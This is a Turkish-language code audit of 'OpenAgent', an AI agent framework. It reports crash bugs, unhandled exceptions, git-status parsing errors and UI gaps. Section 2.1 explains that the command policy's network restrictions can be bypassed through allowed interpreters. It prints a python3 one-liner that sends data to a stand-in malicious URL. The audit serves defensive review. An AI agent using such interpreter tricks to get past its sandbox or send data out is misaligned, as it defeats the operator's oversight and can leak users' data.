# OpenAgent Python Kod Tabanı Analiz Raporu

Bu rapor, `/Users/yasir/Desktop/openagent/src/openagent` dizininde bulunan Python kaynak kodlarının değiştirilmeden analiz edilmesi sonucu elde edilen hata, güvenlik açığı, kararlılık (robustness) ve mimari tasarım eksikliklerini detaylandırmaktadır. 

---

## 1. Kritik Hatalar ve Çökme Riskleri (Crash Bugs)

### 1.1. Git Bağımlılığı Kaynaklı Çökme Zafiyeti (`is_git_repo`)
* **Dosya ve Satır Aralığı:** [worktree.py](file:///Users/yasir/Desktop/openagent/src/openagent/workspaces/worktree.py#L46-L51)
* **Açıklama:** `is_git_repo` fonksiyonu, `git` komutunu çalıştırırken oluşabilecek `GitError` istisnasını yakalamaktadır:
  ```python
  def is_git_repo(path: Path) -> bool:
      try:
          out = _git(["rev-parse", "--is-inside-work-tree"], path)
          return out.strip() == "true"
      except GitError:
          return False
  ```
  Ancak eğer hedef makinede Git yüklü değilse, `_git()` fonksiyonundaki `subprocess.run` doğrudan `FileNotFoundError` (veya işletim sistemine bağlı olarak `OSError`) fırlatacaktır. Bu istisna `GitError` kapsamında olmadığı için yakalanamaz ve programın çökmesine yol açar.
* **Tetiklendiği Yer:** [doctor_service.py](file:///Users/yasir/Desktop/openagent/src/openagent/services/doctor_service.py#L60-L61) dosyası içerisinde, Git kurulu olup olmadığı kontrol edildikten hemen sonra hiçbir koruma olmaksızın `is_git_repo` çağrılır:
  ```python
  git = shutil.which("git")
  checks.append(Check("Git installed", OK if git else FAIL, git or "git not found"))
  is_repo = is_git_repo(self.app.paths.project_root)  # Git kurulu değilse burada çöker!
  ```
  Bu durum, Git kurulu olmayan bir ortamda `openagent doctor` çalıştırıldığında uygulamanın çökmesine neden olur.

### 1.2. Hata Durumunda Çalışmaların Veritabanında "STARTING" Aşamasına Kilitlenmesi
* **Dosya ve Satır Aralığı:** [run_service.py](file:///Users/yasir/Desktop/openagent/src/openagent/services/run_service.py#L102-L135)
* **Açıklama:** `RunService.execute` fonksiyonunda, ajanın çalışma ortamının hazırlanması (`wt.create`) ve başlangıç veritabanı kayıt işlemleri ana `try...except` bloğunun dışındadır:
  ```python
  run.status = RunStatus.STARTING
  self.repos.runs.upsert(run)

  wt = WorktreeManager(self.paths.project_root, self.paths.worktrees_dir)
  workspace = wt.create(run.id, strategy=strategy)  # Hata burada oluşabilir!
  ...
  run.status = RunStatus.RUNNING
  self.repos.runs.upsert(run)
  ```
  Eğer `wt.create` çağrısı sırasında bir disk doluluğu, yetki hatası (`PermissionError`) ya da `GitError` oluşursa, istisna yakalanamaz. Bu durumda veritabanında çalışmanın durumu sonsuza dek `STARTING` (veya `RUNNING`) olarak kalır. Ajan döngüsü başlamadan sonlandığı için durum hiçbir zaman `FAILED` olarak güncellenmez.

### 1.3. Ajan Çalışma Döngüsünde Yakalanamayan Hatalar (Crash in Tool Execution)
* **Dosya ve Satır Aralığı:** [registry.py](file:///Users/yasir/Desktop/openagent/src/openagent/tools/registry.py#L112-L124)
* **Açıklama:** `ToolExecutor.execute` fonksiyonu, araç çağrılarını çalıştırırken yalnızca `ToolError` ve `TypeError` istisnalarını yakalayacak şekilde tasarlanmıştır:
  ```python
  try:
      return tool.handler(self.ctx, **call.arguments)
  except ToolError as exc:
      return ToolResult.failure(str(exc))
  except TypeError as exc:
      return ToolResult.failure(f"invalid arguments for {call.name}: {exc}")
  ```
  Ancak araç gövdelerinde (örneğin [fs.py](file:///Users/yasir/Desktop/openagent/src/openagent/tools/fs.py)) meydana gelebilecek standart işletim sistemi hataları (örneğin korunmuş bir dosyayı okumaya çalışırken `PermissionError`, veya bir dizine dosya yazmaya çalışırken `IsADirectoryError`) `OSError` türündedir. Bu hatalar yakalanmadığı için doğrudan ajan döngüsünün ve dolayısıyla tüm uygulamanın çökmesine yol açar.

---

## 2. Güvenlik ve İzolasyon Zafiyetleri

### 2.1. İzin Profili ve Ağ Kısıtlaması Atlama Açığı (Sandbox Bypass)
* **Dosya ve Satır Aralığı:** [command_policy.py](file:///Users/yasir/Desktop/openagent/src/openagent/security/command_policy.py#L48-L66)
* **Açıklama:** Güvenlik politikasında izin verilen araçlar (`_ALLOWED_EXECUTABLES`) listesinde `python3`, `node`, `bun` ve `deno` gibi dillerin çalışma ortamları yer almaktadır. Ağ kısıtlamalı profillerde `curl` veya `git clone` gibi doğrudan ağ erişim araçları `_NETWORK_PATTERNS` regex'leri ile engellenmeye çalışılsa da, ajan `python3` aracılığıyla ağ istekleri gönderebilir:
  ```bash
  python3 -c "import urllib.request; urllib.request.urlopen('https://zararli-adres.com/veri-sizdir')"
  ```
  Çalıştırılan komutun ana basename'i `python3` olduğu ve komut parametreleri arasında doğrudan regex'e takılan `curl`/`git` kelimeleri yer almadığı için bu komut politika değerlendirmesinden (`evaluate`) onay alarak (`Decision.ALLOW`) doğrudan çalıştırılacaktır. Bu durum, izin profilindeki ağ kısıtlamalarını tamamen işlevsiz kılar.

### 2.2. Alt Süreç (Subprocess) Kaynak Sızıntıları
* **Dosya ve Satır Aralığı:** [base.py](file:///Users/yasir/Desktop/openagent/src/openagent/runtimes/cli/base.py#L195-L231)
* **Açıklama:** `run_managed_cli` fonksiyonu, bir alt süreci (`proc`) asenkron olarak çalıştırıp çıktılarını normalize eden bir generator'dır. Fonksiyon gövdesi, bir `try...finally` bloğu ile korunmamaktadır:
  ```python
  await proc.start()
  ...
  async for line in proc.stream_stdout():
      ...
  code = await proc.wait()
  ```
  Eğer bu asenkron generator'ı tüketen üst döngü (örneğin TUI veya CLI çalıştırıcısı) bir zaman aşımı veya kullanıcı iptali nedeniyle yarıda kesilirse (veya generator garbage collect edilirse), `proc` süreci arka planda sonlandırılmadan açık kalacaktır. Bu durum arka planda zombi/yetim süreçlerin birikmesine (resource leak) yol açar.

---

## 3. Mantıksal ve İşlevsel Hatalar (Logical & Functional Bugs)

### 3.1. Git Status Çıktısı Ayrıştırma Hatası (Renames & Escapes)
* **Dosya ve Satır Aralığı:** [worktree.py](file:///Users/yasir/Desktop/openagent/src/openagent/workspaces/worktree.py#L173-L181)
* **Açıklama:** `changed_files` fonksiyonu, git değişikliklerini tespit etmek için `--porcelain` çıktısını basitçe satır bazlı keserek ayrıştırır:
  ```python
  out = _git(["status", "--porcelain"], ws.root)
  files = []
  for line in out.splitlines():
      if line.strip():
          files.append(line[3:].strip())
  ```
  * **Yeniden Adlandırma Hatası:** Git üzerinde bir dosya yeniden adlandırıldığında (`git mv`), porcelain çıktısı `R  eski_dosya -> yeni_dosya` şeklinde olur. Kod bu satırı ayrıştırdığında dosya ismi olarak `"eski_dosya -> yeni_dosya"` metnini alır ve bu isimde bir dosya bulunamadığı için hatalara yol açar.
  * **Kaçış Karakterleri Hatası:** Dosya adında boşluklar veya Türkçe karakterler (Örn: `Rapor.md`) bulunuyorsa, Git bunları tırnak içerisine alıp octal kaçış dizileriyle (Örn: `"\303\226rnek.txt"`) gösterir. Kod bu kaçış dizilerini çözmediği için dosya adları bozuk tespit edilecektir.

### 3.2. Komut Şablonu Yerleştirme Hatası (Generic CLI)
* **Dosya ve Satır Aralığı:** [generic.py](file:///Users/yasir/Desktop/openagent/src/openagent/runtimes/cli/generic.py#L74-L75)
* **Açıklama:** Jenerik CLI çalıştırıcısında çalıştırılacak komut şablonunun yerleştirilmesi şu şekilde yapılmıştır:
  ```python
  args = [self.executable if t == "{executable}" else t.replace("{prompt}", request.prompt)
          for t in self.manifest.run_template]
  ```
  Buradaki mantık hatası, `{executable}` yer tutucusunun yalnızca token'ın kendisine eşit olması durumunda (`t == "{executable}"`) değiştirilmesidir. Eğer şablon içerisinde `--bin={executable}` gibi bir token yer alıyorsa, bu token `{executable}` değerine tam eşit olmadığı için değiştirilmeyecek ve komut hata verecektir. Python'ın yerleşik `.replace()` fonksiyonunun her iki durum için de genel olarak çağrılması daha kararlı bir sonuç üretecektir.

### 3.3. Model Keşfindeki Hataların Kullanıcıdan Gizlenmesi
* **Dosya ve Satır Aralığı:** [provider_service.py](file:///Users/yasir/Desktop/openagent/src/openagent/services/provider_service.py#L291-L294), [L319-320](file:///Users/yasir/Desktop/openagent/src/openagent/services/provider_service.py#L319-L320)
* **Açıklama:** Sağlayıcı servis katmanında, model listesi API üzerinden çekilirken meydana gelen tüm istisnalar `except Exception:` ile yakalanıp yutulmakta ve boş bir liste (`[]`) dönülmektedir:
  ```python
  try:
      return await adapter.list_models()
  except Exception:  # hata yutuluyor
      return []
  ```
  Bu durum, kullanıcının API anahtarının geçersiz olması, ağ bağlantısı bulunmaması veya sağlayıcı URL'inin yanlış yapılandırılması gibi durumlarda hata mesajı üretilmesini engeller. Kullanıcı model listesinin neden boş olduğunu anlayamaz ve hata ayıklama yapamaz.

### 3.4. Geçici İzleme Dosyalarının Çalışma Dizinine Sızması
* **Dosya ve Satır Aralığı:** [codex.py](file:///Users/yasir/Desktop/openagent/src/openagent/runtimes/cli/codex.py#L76-L80)
* **Açıklama:** Codex adaptörü, çalışmanın sonucunu kontrol etmek için geçici dosyasını doğrudan çalışma dizini kökünde `.codex-final.txt` adıyla oluşturur. Ancak bu dosya ismi, `WorktreeManager` içindeki yoksayılanlar listesinde (`_IGNORE_DIRS`) yer almamaktadır. Dolayısıyla, ajanın yaptığı değişiklikler diff olarak alınırken `.codex-final.txt` dosyası da ajanın oluşturduğu/değiştirdiği bir dosya gibi algılanır ve git diff veya çalışma sonuçlarına sızar.

---

## 4. Kullanıcı Deneyimi ve Arayüz Eksiklikleri

### 4.1. TUI Gösterge Panelinin Güncellenmemesi (Stale Dashboard Stats)
* **Dosya ve Satır Aralığı:** [app.py](file:///Users/yasir/Desktop/openagent/src/openagent/tui/app.py#L57-L75)
* **Açıklama:** TUI Dashboard ekranı açıldığında istatistikler (aktif ajanlar, çalışan/başarısız olan işlerin sayıları vb.) `on_mount` sırasında bir kez yüklenir. Arka planda ajanlar çalışmaya devam etse de istatistiklerin otomatik güncellenmesini sağlayan bir interval/timer mekanizması kurulmamıştır. Bilgiler ancak kullanıcı manuel olarak `r` tuşuna basarsa güncellenir, aksi halde sürekli eski veriler gösterilir.

### 4.2. Gereksiz Klasör Oluşturma Davranışı (`ensure_dirs`)
* **Dosya ve Satır Aralığı:** [config.py](file:///Users/yasir/Desktop/openagent/src/openagent/config.py#L86-L97)
* **Açıklama:** `OpenAgentApp` sınıfının başlatıcısı her çağrıldığında `ensure_dirs` fonksiyonu çalıştırılır. Bu fonksiyon, bulunulan dizinde `.openagent`, `.openagent/runs`, `.openagent/worktrees` vb. klasörleri otomatik olarak oluşturur. Örneğin kullanıcı sadece veritabanındaki kayıtlı ajanları listelemek için `openagent list` komutunu çalıştırsa dahi, uygulamanın çalıştırıldığı dizinde gereksiz yere boş bir `.openagent` klasör ağacı yaratılır. Bu durum disk üzerinde dağınıklığa sebep olur; klasörler yalnızca `init` veya `run` gibi işlem gerektiren komutlarda oluşturulmalıdır.
